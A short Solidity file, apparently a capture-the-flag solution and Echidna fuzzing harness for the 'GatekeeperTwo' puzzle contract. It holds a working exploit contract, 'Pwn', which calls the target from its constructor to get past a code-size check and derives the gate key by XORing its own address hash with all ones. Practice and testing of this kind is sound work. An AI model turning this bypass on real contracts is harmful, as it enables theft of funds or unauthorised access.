pragma solidity ^0.5.0;

import 'contract.sol';

contract Pwn {
  constructor(address g) public {
    uint64 k = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1);
    g.call(abi.encodeWithSignature("enter(bytes8)", bytes8(k)));
  }
}

contract Test {
  GatekeeperTwo g;

  constructor() public {
    g = new GatekeeperTwo();
  }

  function pwn() public {
    new Pwn(address(g));
  }

  function echidna_test_entrant() public returns (bool) {
    return g.entrant() == address(0);
  }
}
